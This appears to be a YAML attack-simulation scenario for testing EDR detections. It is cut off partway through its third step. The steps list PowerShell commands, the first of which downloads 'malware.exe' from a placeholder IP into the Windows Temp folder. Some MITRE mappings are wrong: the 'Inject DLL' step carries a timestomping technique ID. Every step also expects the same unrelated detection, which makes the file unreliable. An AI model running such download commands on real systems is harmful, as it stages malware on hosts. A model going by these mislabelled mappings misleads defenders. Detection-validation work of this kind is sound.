steps:
- id: step-01
  name: Download Malware
  command: powershell -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
    Invoke-WebRequest -Uri 'http://192.0.2.10/malware.exe' -OutFile 'C:\\Windows\\Temp\\malware.exe';"
  identity: direct
  mitre_technique: T1059.001
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Phantom DLL Loading Behavior
    ttp_ref: TTP-0000-0130
    detection_id: bioc-phantom-dll-loading-behavior
- id: step-02
  name: Start Suspicious Process
  command: 'powershell -Command "$proc = Start-Process -FilePath ''C:\\Windows\\System32\\svchost.exe''
    -PassThru; $procId = $proc.Id; Write-Host ''Process ID: '' $procId;"'
  identity: direct
  mitre_technique: T1055.001
  platforms:
  - windows
  expected_detections:
  - plane: EDR
    type: BIOC
    description: Phantom DLL Loading Behavior
    ttp_ref: TTP-0000-0130
    detection_id: bioc-phantom-dll-loading-behavior
  causality:
    parent_step: step-01
    pivot: process_lineage
- id: step-03
  name: Inject DLL
  command: 'powershell -Command "$injectScript = ''C:\\Windows\\Temp\\inject.dll''; Write-Host ''DLL Path:
    '' $injectScript;"'
  identity: direct
  mitre_technique: T1070.006
  platforms:
